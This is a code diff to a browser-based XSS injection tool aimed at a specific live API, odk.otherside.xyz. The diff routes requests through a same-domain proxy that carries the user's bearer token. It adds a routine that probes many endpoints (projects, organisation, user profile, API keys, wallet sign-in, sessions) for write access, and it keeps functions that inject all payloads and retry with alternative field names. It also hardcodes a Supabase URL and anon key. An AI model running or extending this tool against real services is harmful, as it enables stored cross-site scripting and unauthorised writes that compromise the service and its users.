@@ -436,15 +436,6 @@
                     <button class="btn btn-danger" onclick="injectAllPayloads()">Inject ALL Payloads</button>
                     <button class="btn btn-outline" onclick="testXSSReflection()">Test Reflection First</button>
                 </div>
-                <div class="input-group" style="margin-top:12px;">
-                    <label>CORS Proxy (if direct fetch fails):</label>
-                    <select id="corsProxy">
-                        <option value="">Direct (no proxy)</option>
-                        <option value="https://corsproxy.io/?">corsproxy.io</option>
-                        <option value="https://api.allorigins.win/raw?url=">allorigins.win</option>
-                        <option value="https://cors-anywhere.herokuapp.com/">cors-anywhere</option>
-                    </select>
-                </div>
             </div>
             <div class="card">
                 <h3>XSS Injection Log</h3>
@@ -473,6 +464,7 @@
         // CONFIGURATION
         // =====================================================
         const API = 'https://odk.otherside.xyz/api/v0';
+        const PROXY = '/api/proxy';  // Same-domain proxy - no CORS issues!
 
         const SUPABASE_URL = 'https://anruszfozkhgddzpcpft.supabase.co';
         const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFucnVzemZvemtoZ2RkenBjcGZ0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc5MjE2NzcsImV4cCI6MjA5MzQ5NzY3N30.Ap3qNDAfJeKYS-3cUn3_A2c4rif3v13mx2Ex1uukp7c';
@@ -1020,136 +1012,153 @@
         });
 
         // =====================================================
-        // CORS PROXY AWARE FETCH
+        // PROXY FETCH - Uses same-domain Vercel serverless proxy
+        // No CORS issues because proxy is on same domain!
         // =====================================================
-        function getApiUrl(endpoint) {
-            const proxy = document.getElementById('corsProxy')?.value || '';
-            const fullUrl = `${API}/${endpoint}`;
-            if (proxy) {
-                return proxy + encodeURIComponent(fullUrl);
+        async function proxyFetch(endpoint, options = {}) {
+            const method = options.method || 'GET';
+            const body = options.body || null;
+
+            try {
+                const resp = await fetch(PROXY, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        endpoint: endpoint,
+                        method: method,
+                        body: body,
+                        token: idToken || ''
+                    })
+                });
+
+                const result = await resp.json();
+
+                // Create a Response-like object from the proxy result
+                return {
+                    ok: result.status >= 200 && result.status < 300,
+                    status: result.status,
+                    statusText: result.statusText || '',
+                    json: async () => result.data,
+                    text: async () => typeof result.data === 'string' ? result.data : JSON.stringify(result.data),
+                    _proxyResult: result
+                };
+            } catch(e) {
+                throw new Error(`Proxy fetch failed: ${e.message}`);
             }
-            return fullUrl;
         }
 
-        async function corsFetch(endpoint, options = {}) {
-            const proxy = document.getElementById('corsProxy')?.value || '';
-            const fullUrl = `${API}/${endpoint}`;
-
-            // Build headers
-            const headers = {
-                'Authorization': `Bearer ${idToken}`,
-                'Content-Type': 'application/json',
-                ...(options.headers || {})
-            };
-
-            // Try direct fetch first
-            if (!proxy) {
-                try {
-                    const resp = await fetch(fullUrl, { ...options, headers });
-                    return resp;
-                } catch(e) {
-                    log('xssLog', `[CORS] Direct fetch failed: ${e.message}`, 'warning');
-                    log('xssLog', `[CORS] Trying CORS proxy automatically...`, 'warning');
-                    // Auto-fallback to corsproxy.io
-                    const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(fullUrl);
-                    const resp = await fetch(proxyUrl, { ...options, headers });
-                    return resp;
-                }
+        // Direct fetch for GET requests (CORS * works fine for GET)
+        async function apiGet(endpoint) {
+            try {
+                const headers = { 'Content-Type': 'application/json' };
+                if (idToken) headers['Authorization'] = `Bearer ${idToken}`;
+                const resp = await fetch(`${API}/${endpoint}`, { headers });
+                return resp;
+            } catch(e) {
+                // Fallback to proxy
+                return await proxyFetch(endpoint, { method: 'GET' });
             }
+        }
 
-            // Use selected proxy
-            const proxyUrl = proxy + encodeURIComponent(fullUrl);
-            const resp = await fetch(proxyUrl, { ...options, headers });
-            return resp;
+        // Write fetch (POST/PATCH/PUT/DELETE) - always use proxy
+        async function apiWrite(endpoint, method, body) {
+            return await proxyFetch(endpoint, { method, body });
         }
 
         // =====================================================
         // TEST API CONNECTION
         // =====================================================
         async function testAPIConnection() {
-            log('xssLog', '[TEST] Testing API connectivity...', 'info');
+            log('xssLog', '[TEST] Testing API connectivity via proxy...', 'info');
 
-            // Test 1: Simple GET without auth (should work - CORS *)
+            // Test 1: GET without auth via direct fetch
             log('xssLog', '[TEST] 1. GET /organizations/current (no auth)...', 'info');
             try {
                 const resp = await fetch(`${API}/organizations/current`);
                 if (resp.ok) {
                     const data = await resp.json();
-                    log('xssLog', `[TEST] GET OK! Org: ${data.name}`, 'success');
-                } else {
-                    log('xssLog', `[TEST] GET failed: ${resp.status}`, 'error');
+                    log('xssLog', `[TEST] Direct GET OK! Org: ${data.name}`, 'success');
                 }
             } catch(e) {
-                log('xssLog', `[TEST] GET error: ${e.message}`, 'error');
+                log('xssLog', `[TEST] Direct GET error: ${e.message}`, 'warning');
             }
 
-            // Test 2: Authenticated GET
+            // Test 2: GET with auth via proxy
             if (!idToken) {
                 log('xssLog', '[TEST] 2. SKIPPED - Not authenticated yet', 'warning');
             } else {
-                log('xssLog', `[TEST] 2. GET /organizations/projects (with auth, token: ${idToken.substring(0,20)}...)`, 'info');
+                log('xssLog', `[TEST] 2. Proxy GET /organizations/projects...`, 'info');
                 try {
-                    const resp = await fetch(`${API}/organizations/projects`, {
-                        headers: {
-                            'Authorization': `Bearer ${idToken}`,
-                            'Content-Type': 'application/json'
-                        }
-                    });
-                    log('xssLog', `[TEST] Auth GET status: ${resp.status}`, resp.ok ? 'success' : 'warning');
+                    const resp = await proxyFetch('organizations/projects', { method: 'GET' });
+                    log('xssLog', `[TEST] Proxy GET status: ${resp.status}`, resp.ok ? 'success' : 'warning');
                     if (resp.ok) {
                         const data = await resp.json();
-                        log('xssLog', `[TEST] Auth GET works! Data: ${JSON.stringify(data).substring(0, 80)}...`, 'success');
+                        log('xssLog', `[TEST] Proxy GET works! Data: ${JSON.stringify(data).substring(0, 80)}...`, 'success');
                     }
                 } catch(e) {
-                    log('xssLog', `[TEST] Auth GET error: ${e.message}`, 'error');
+                    log('xssLog', `[TEST] Proxy GET error: ${e.message}`, 'error');
                 }
             }
 
-            // Test 3: POST without auth (should get 401, not CORS error)
-            log('xssLog', '[TEST] 3. POST /organizations/projects (no auth - testing CORS preflight)...', 'info');
-            try {
-                const resp = await fetch(`${API}/organizations/projects`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ name: 'connection_test' })
-                });
-                if (resp.status === 401) {
-                    log('xssLog', `[TEST] POST CORS OK! (401 = auth required, CORS passed)`, 'success');
-                } else {
-                    log('xssLog', `[TEST] POST status: ${resp.status}`, resp.status < 500 ? 'success' : 'error');
-                }
-            } catch(e) {
-                log('xssLog', `[TEST] POST CORS FAILED: ${e.message}`, 'error');
-                log('xssLog', `[TEST] Try selecting a CORS proxy from the dropdown above!`, 'warning');
-            }
-
-            // Test 4: Authenticated POST
+            // Test 3: POST with auth via proxy (the important one!)
             if (idToken) {
-                log('xssLog', '[TEST] 4. POST /organizations/projects (with auth)...', 'info');
+                log('xssLog', '[TEST] 3. Proxy POST /organizations/projects (with auth)...', 'info');
                 try {
-                    const resp = await fetch(`${API}/organizations/projects`, {
-                        method: 'POST',
-                        headers: {
-                            'Authorization': `Bearer ${idToken}`,
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({ name: 'connection_test', description: 'test' })
-                    });
-                    log('xssLog', `[TEST] Auth POST status: ${resp.status}`, resp.ok ? 'success' : 'warning');
+                    const resp = await apiWrite('organizations/projects', 'POST',
+                        JSON.stringify({ name: 'connection_test', description: 'test' }));
+                    log('xssLog', `[TEST] Proxy POST status: ${resp.status}`, resp.ok ? 'success' : 'warning');
                     if (resp.ok) {
                         const data = await resp.json();
-                        log('xssLog', `[TEST] Auth POST works! Response: ${JSON.stringify(data).substring(0, 100)}`, 'success');
+                        log('xssLog', `[TEST] Proxy POST works! Created: ${JSON.stringify(data).substring(0, 80)}`, 'success');
                     } else {
-                        const errText = await resp.text().catch(() => '');
-                        log('xssLog', `[TEST] Auth POST response: ${resp.status} ${errText.substring(0, 80)}`, 'warning');
+                        const errText = await resp.text();
+                        log('xssLog', `[TEST] Proxy POST response: ${resp.status} ${errText.substring(0, 80)}`, 'warning');
+                        if (resp.status === 403) {
+                            log('xssLog', `[TEST] 403 = User lacks write permission. Trying other endpoints...`, 'warning');
+                            // Try alternative endpoints
+                            await testWritableEndpoints();
+                        }
                     }
                 } catch(e) {
-                    log('xssLog', `[TEST] Auth POST error: ${e.message}`, 'error');
-                    log('xssLog', `[TEST] Select CORS proxy and try again!`, 'warning');
+                    log('xssLog', `[TEST] Proxy POST error: ${e.message}`, 'error');
                 }
             }
 
             log('xssLog', '[TEST] Connection test complete.', 'info');
+        }
+
+        async function testWritableEndpoints() {
+            const endpoints = [
+                { ep: 'organizations/projects', method: 'POST', body: { name: 'test', description: 'test' } },
+                { ep: 'organizations/current', method: 'PATCH', body: { name: 'test' } },
+                { ep: 'accounts/users/current', method: 'PATCH', body: { displayName: 'test' } },
+                { ep: 'organizations/apiKeys', method: 'POST', body: { displayName: 'test' } },
+                { ep: 'worlds', method: 'POST', body: { name: 'test', description: 'test' } },
+                { ep: 'wallet/nonce', method: 'POST', body: { evmWalletAddress: '0x0000000000000000000000000000000000000000' } },
+                { ep: 'wallet/verify/signin', method: 'POST', body: { evmWalletAddress: '0x0000000000000000000000000000000000000000' } },
+                { ep: 'sessions', method: 'POST', body: {} },
+                { ep: 'organizations/projects', method: 'PUT', body: { name: 'test' } },
+            ];
+
+            for (const e of endpoints) {
+                try {
+                    const resp = await apiWrite(e.ep, e.method, JSON.stringify(e.body));
+                    const label = `${e.method} /${e.ep}`;
+                    if (resp.ok) {
+                        log('xssLog', `[+] ${label}: ${resp.status} - WRITABLE!`, 'success');
+                    } else if (resp.status === 400) {
+                        log('xssLog', `[?] ${label}: 400 - EXISTS but wrong params (might be writable!)`, 'warning');
+                    } else if (resp.status === 403) {
+                        log('xssLog', `[-] ${label}: 403 - Forbidden`, 'error');
+                    } else if (resp.status === 401) {
+                        log('xssLog', `[-] ${label}: 401 - Auth issue`, 'error');
+                    } else {
+                        log('xssLog', `[?] ${label}: ${resp.status}`, 'warning');
+                    }
+                } catch(e) {
+                    log('xssLog', `[!] ${e.method} /${e.ep}: ${e.message}`, 'error');
+                }
+            }
         }
 
         // =====================================================
@@ -1212,10 +1221,7 @@
             }
 
             try {
-                const resp = await corsFetch(endpoint, {
-                    method: method,
-                    body: body
-                });
+                const resp = await apiWrite(endpoint, method, body);
 
                 if (resp.ok) {
                     const data = await resp.json();
@@ -1234,16 +1240,17 @@
                     });
 
                 } else {
-                    const errText = await resp.text().catch(() => '');
+                    const errText = await resp.text();
                     log('xssLog', `[-] Injection failed: ${resp.status} ${errText.substring(0, 100)}`, 'error');
                     if (resp.status === 400 || resp.status === 422) {
                         log('xssLog', `[RETRY] Trying alternative field names...`, 'warning');
                         await tryAlternativeFields(endpoint, method, payload);
+                    } else if (resp.status === 403) {
+                        log('xssLog', `[-] 403 = No write permission on this endpoint. Try another!`, 'warning');
                     }
                 }
             } catch(e) {
                 log('xssLog', `[!] Request error: ${e.message}`, 'error');
-                log('xssLog', `[TIP] Try selecting a CORS proxy from the dropdown!`, 'warning');
             }
             updateStats();
         }
@@ -1265,10 +1272,7 @@
 
             for (const body of fieldVariants) {
                 try {
-                    const resp = await corsFetch(endpoint, {
-                        method: method,
-                        body: JSON.stringify(body)
-                    });
+                    const resp = await apiWrite(endpoint, method, JSON.stringify(body));
 
                     if (resp.ok) {
                         const data = await resp.json();
@@ -1313,10 +1317,7 @@
                     bodyObj[target.field] = p.payload;
                     if (target.method === 'POST') bodyObj.description = `Test ${p.name}`;
 
-                    const resp = await corsFetch(target.endpoint, {
-                        method: target.method,
-                        body: JSON.stringify(bodyObj)
-                    });
+                    const resp = await apiWrite(target.endpoint, target.method, JSON.stringify(bodyObj));
 
                     if (resp.ok) {
                         log('xssLog', `[+] ${p.name}: INJECTED into ${target.desc}!`, 'success');
@@ -1333,7 +1334,7 @@
                         });
                     } else {
                         const status = resp.status;
-                        const errText = await resp.text().catch(() => '');
+                        const errText = await resp.text();
                         log('xssLog', `[-] ${p.name}: Failed (${status}) ${errText.substring(0, 60)}`, 'error');
 
                         if (status === 400 || status === 422) {
@@ -1370,10 +1371,7 @@
                     bodyObj[t.field] = testPayload;
                     if (t.method === 'POST') bodyObj.description = 'XSS Test';
 
-                    const resp = await corsFetch(t.endpoint, {
-                        method: t.method,
-                        body: JSON.stringify(bodyObj)
-                    });
+                    const resp = await apiWrite(t.endpoint, t.method, JSON.stringify(bodyObj));
 
                     if (resp.ok) {
                         const data = await resp.json();
@@ -1390,7 +1388,7 @@
                             notes: `XSS reflection test: ${t.desc}`
                         });
                     } else {
-                        const errText = await resp.text().catch(() => '');
+                        const errText = await resp.text();
                         log('xssLog', `[-] ${t.desc}: Failed (${resp.status}) ${errText.substring(0, 60)}`, 'error');
                     }
                 } catch(e) {
